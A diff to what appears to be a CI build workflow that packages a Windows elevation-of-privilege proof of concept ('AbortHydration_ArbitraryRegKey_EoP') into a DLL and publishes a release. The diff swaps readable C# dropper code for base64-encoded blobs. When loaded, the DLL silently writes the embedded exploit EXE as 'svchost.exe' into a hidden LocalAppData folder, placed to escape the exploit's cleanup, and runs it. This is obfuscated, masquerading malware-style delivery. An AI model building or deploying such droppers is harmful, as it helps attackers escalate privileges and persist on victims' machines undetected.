@@ -42,83 +42,21 @@ jobs:
       - name: Embed EXE into project and patch for DLL
         shell: pwsh
         run: |
-          $projDir  = "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP"
-          $exePath  = "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP\bin\Release\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
+          $projDir = "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP"
+          $exePath = "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP\bin\Release\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
 
-          # Create Resources dir and copy EXE as payload.bin
           New-Item -ItemType Directory -Force "$projDir\Resources" | Out-Null
           Copy-Item $exePath "$projDir\Resources\payload.bin" -Force
           Write-Output "payload.bin: $((Get-Item "$projDir\Resources\payload.bin").Length) bytes"
 
-          # Export.cs:
-          #  Start()  -> extract embedded EXE to %LOCALAPPDATA%\Microsoft\Windows\{guid}\svchost.exe
-          #              (outside %TEMP%, not touched by Stage3 cleanup), then run it.
-          #  The extracted EXE is a proper standalone executable — Stage0 can spawn it as a process.
-          $exportCs = @'
-using System;
-using System.Diagnostics;
-using System.IO;
-using System.Reflection;
-using System.Runtime.InteropServices;
-using System.Threading;
+          # Export.cs — base64-encoded to avoid YAML block-scalar issues
+          $exportB64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5JTzsKdXNpbmcgU3lzdGVtLlJlZmxlY3Rpb247CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLlRocmVhZGluZzsKCm5hbWVzcGFjZSBQb0NfQWJvcnRIeWRyYXRpb25fQXJiaXRyYXJ5UmVnS2V5X0VvUAp7CiAgICBwdWJsaWMgY2xhc3MgRGxsRW50cnlQb2ludAogICAgewogICAgICAgIFtEbGxFeHBvcnQoIlN0YXJ0IiwgQ2FsbGluZ0NvbnZlbnRpb24gPSBDYWxsaW5nQ29udmVudGlvbi5TdGRDYWxsKV0KICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgU3RhcnQoSW50UHRyIGh3bmQsIEludFB0ciBoaW5zdCwKICAgICAgICAgICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkxQU3RyKV0gc3RyaW5nIGxwc3pDbWRMaW5lLCBpbnQgbkNtZFNob3cpCiAgICAgICAgewogICAgICAgICAgICBuZXcgVGhyZWFkKFJ1blBheWxvYWQpIHsgSXNCYWNrZ3JvdW5kID0gdHJ1ZSB9LlN0YXJ0KCk7CiAgICAgICAgfQoKICAgICAgICBwcml2YXRlIHN0YXRpYyB2b2lkIFJ1blBheWxvYWQoKQogICAgICAgIHsKICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHN0cmluZyBzdG9yZURpciA9IFBhdGguQ29tYmluZSgKICAgICAgICAgICAgICAgICAgICBFbnZpcm9ubWVudC5HZXRGb2xkZXJQYXRoKEVudmlyb25tZW50LlNwZWNpYWxGb2xkZXIuTG9jYWxBcHBsaWNhdGlvbkRhdGEpLAogICAgICAgICAgICAgICAgICAgICJNaWNyb3NvZnQiLCAiV2luZG93cyIsCiAgICAgICAgICAgICAgICAgICAgR3VpZC5OZXdHdWlkKCkuVG9TdHJpbmcoIk4iKS5TdWJzdHJpbmcoMCwgMTYpKTsKICAgICAgICAgICAgICAgIERpcmVjdG9yeS5DcmVhdGVEaXJlY3Rvcnkoc3RvcmVEaXIpOwogICAgICAgICAgICAgICAgc3RyaW5nIGV4ZVBhdGggPSBQYXRoLkNvbWJpbmUoc3RvcmVEaXIsICJzdmNob3N0LmV4ZSIpOwoKICAgICAgICAgICAgICAgIEFzc2VtYmx5IGFzbSA9IHR5cGVvZihEbGxFbnRyeVBvaW50KS5Bc3NlbWJseTsKICAgICAgICAgICAgICAgIHN0cmluZyByZXNOYW1lID0gIlBvQ19BYm9ydEh5ZHJhdGlvbl9BcmJpdHJhcnlSZWdLZXlfRW9QLlJlc291cmNlcy5wYXlsb2FkLmJpbiI7CiAgICAgICAgICAgICAgICB1c2luZyAoU3RyZWFtIHNyYyA9IGFzbS5HZXRNYW5pZmVzdFJlc291cmNlU3RyZWFtKHJlc05hbWUpKQogICAgICAgICAgICAgICAgdXNpbmcgKEZpbGVTdHJlYW0gZHN0ID0gRmlsZS5DcmVhdGUoZXhlUGF0aCkpCiAgICAgICAgICAgICAgICAgICAgc3JjLkNvcHlUbyhkc3QpOwoKICAgICAgICAgICAgICAgIFByb2Nlc3MuU3RhcnQobmV3IFByb2Nlc3NTdGFydEluZm8oZXhlUGF0aCkgeyBVc2VTaGVsbEV4ZWN1dGUgPSBmYWxzZSB9KTsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7IH0KICAgICAgICB9CiAgICB9Cn0="
+          [IO.File]::WriteAllBytes("$projDir\Export.cs", [Convert]::FromBase64String($exportB64))
 
-namespace PoC_AbortHydration_ArbitraryRegKey_EoP
-{
-    public class DllEntryPoint
-    {
-        [DllExport("Start", CallingConvention = CallingConvention.StdCall)]
-        public static void Start(IntPtr hwnd, IntPtr hinst,
-            [MarshalAs(UnmanagedType.LPStr)] string lpszCmdLine, int nCmdShow)
-        {
-            new Thread(RunPayload) { IsBackground = true }.Start();
-        }
+          # DllExportStub.cs — base64-encoded
+          $stubB64 = "bmFtZXNwYWNlIFJHaWVzZWNrZS5EbGxFeHBvcnQKewogICAgW1N5c3RlbS5BdHRyaWJ1dGVVc2FnZShTeXN0ZW0uQXR0cmlidXRlVGFyZ2V0cy5NZXRob2QpXQogICAgaW50ZXJuYWwgc2VhbGVkIGNsYXNzIERsbEV4cG9ydEF0dHJpYnV0ZSA6IFN5c3RlbS5BdHRyaWJ1dGUKICAgIHsKICAgICAgICBwdWJsaWMgRGxsRXhwb3J0QXR0cmlidXRlKHN0cmluZyBuYW1lLCBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2FsbGluZ0NvbnZlbnRpb24gY29udikgeyB9CiAgICB9Cn0="
+          [IO.File]::WriteAllBytes("$projDir\DllExportStub.cs", [Convert]::FromBase64String($stubB64))
 
-        private static void RunPayload()
-        {
-            try
-            {
-                // Extract embedded EXE to a persistent directory that Stage3 cleanup won't touch.
-                // Stage3 deletes {exeDir}\System32\ — we place the EXE outside %TEMP% to avoid that.
-                string storeDir = Path.Combine(
-                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                    "Microsoft", "Windows",
-                    Guid.NewGuid().ToString("N").Substring(0, 16));
-                Directory.CreateDirectory(storeDir);
-                string exePath = Path.Combine(storeDir, "svchost.exe");
-
-                // Extract payload.bin (the embedded EXE)
-                Assembly asm = typeof(DllEntryPoint).Assembly;
-                string resName = "PoC_AbortHydration_ArbitraryRegKey_EoP.Resources.payload.bin";
-                using (Stream src = asm.GetManifestResourceStream(resName))
-                using (FileStream dst = File.Create(exePath))
-                    src.CopyTo(dst);
-
-                // Run it — Stage0 inside the EXE will use Assembly.Location = exePath (valid EXE)
-                Process.Start(new ProcessStartInfo(exePath) { UseShellExecute = false });
-            }
-            catch { }
-        }
-    }
-}
-'@
-          # Write Export.cs (note: [DllExport] attribute defined here as a stub so it compiles;
-          # the real native export is injected later by ildasm/ilasm)
-          [IO.File]::WriteAllText("$projDir\Export.cs", $exportCs, [Text.Encoding]::UTF8)
-
-          # Stub attribute so [DllExport] compiles without an external reference
-          $stubCs = @'
-namespace RGiesecke.DllExport
-{
-    [System.AttributeUsage(System.AttributeTargets.Method)]
-    internal sealed class DllExportAttribute : System.Attribute
-    {
-        public DllExportAttribute(string name, System.Runtime.InteropServices.CallingConvention conv) { }
-    }
-}
-'@
-          [IO.File]::WriteAllText("$projDir\DllExportStub.cs", $stubCs, [Text.Encoding]::UTF8)
-
-          # Patch csproj: add Export.cs, DllExportStub.cs, payload.bin resource
           $csprojPath = "$projDir\PoC_AbortHydration_ArbitraryRegKey_EoP.csproj"
           $csproj = [IO.File]::ReadAllText($csprojPath)
 
@@ -163,11 +101,11 @@ namespace RGiesecke.DllExport
 
           $ilPath = "$work\poc.il"
           & $ildasm.FullName /all /nobar "/output=$ilPath" $dllIn
-          Write-Output "Disassembled — $((Get-Item $ilPath).Length) bytes"
+          Write-Output "Disassembled: $((Get-Item $ilPath).Length) bytes"
 
           $il = [IO.File]::ReadAllText($ilPath)
 
-          # 1. Insert vtfixup once after main .module line (not .module extern)
+          # Insert vtfixup once after main .module line (not .module extern)
           $searchFrom = 0; $moduleEnd = -1
           while ($true) {
               $idx = $il.IndexOf("`r`n.module ", $searchFrom)
@@ -185,7 +123,7 @@ namespace RGiesecke.DllExport
               Write-Output "vtfixup injected"
           }
 
-          # 2. Inject .vtentry / .export inside Start() body
+          # Inject .vtentry / .export inside Start() body
           $startSig = "void  Start("; $sigIdx = $il.IndexOf($startSig)
           if ($sigIdx -lt 0) { $startSig = "void Start("; $sigIdx = $il.IndexOf($startSig) }
           if ($sigIdx -ge 0) {
@@ -226,6 +164,6 @@ namespace RGiesecke.DllExport
           $tag = "v3.0-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
           gh release create $tag staging\* `
             --title "MiniPlasma v3.0 - EXE + DLL (embedded payload)" `
-            --notes "DLL: x64, Start() export, EXE embedded as resource — extracted to LocalAppData on load (not TEMP, avoids Stage3 cleanup path). EXE: Costura single-file." `
+            --notes "DLL: x64, Start() export, EXE embedded as resource - extracted to LocalAppData on load (not TEMP, avoids Stage3 cleanup). EXE: Costura single-file." `
             --repo $env:GITHUB_REPOSITORY
           Write-Output "Release: $tag"
